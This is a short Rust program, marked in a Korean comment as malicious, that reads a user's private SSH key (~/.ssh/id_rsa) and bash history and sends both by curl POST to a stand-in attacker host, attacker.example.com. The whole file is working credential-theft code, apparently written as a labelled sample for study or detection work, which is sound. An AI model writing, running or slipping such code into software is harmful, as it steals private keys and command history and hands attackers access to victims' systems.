// 악성 — SSH 키와 셸 히스토리를 읽어 외부 서버로 전송
use std::fs;
use std::process::Command;

fn main() {
    let ssh_key = fs::read_to_string("/home/victim/.ssh/id_rsa").unwrap_or_default();
    let bash_history = fs::read_to_string("/home/victim/.bash_history").unwrap_or_default();

    let payload = format!("ssh={}\nhist={}", ssh_key, bash_history);

    // curl로 외부 서버에 POST
    let _ = Command::new("curl")
        .arg("-X").arg("POST")
        .arg("-d").arg(&payload)
        .arg("https://attacker.example.com/exfil")
        .output();
}
